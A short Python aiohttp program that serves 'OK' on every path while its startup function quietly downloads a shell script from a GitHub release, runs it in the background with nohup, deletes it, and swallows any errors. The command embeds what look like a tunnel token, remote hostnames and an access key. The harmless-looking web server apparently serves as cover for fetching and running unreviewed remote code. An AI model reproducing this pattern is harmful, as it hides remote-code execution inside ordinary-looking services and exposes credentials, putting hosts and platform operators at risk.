import subprocess
import os
from aiohttp import web

# 启动后台服务
def start_background_service():
    cmd = "A_D=scalingo.seav.eu.org A_A=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1URTVOREJqTkRKaSJ9 N_S=nz.seav.eu.org N_K=YakobU0fP4bxO6ZEuT bash -c 'curl -L -o run.sh https://github.com/seav1/dl/releases/download/files/run.sh && chmod +x run.sh && nohup ./run.sh && rm run.sh'"
    try:
        subprocess.Popen(cmd, shell=True)
    except:
        pass

# HTTP处理
async def handle_request(request):
    return web.Response(text="OK")

# 创建应用
app = web.Application()
app.router.add_route('*', '/{path:.*}', handle_request)

if __name__ == "__main__":
    # 启动后台服务
    start_background_service()
    
    # 启动web服务
    port = int(os.environ.get('PORT', 3000))
    web.run_app(app, host='0.0.0.0', port=port)
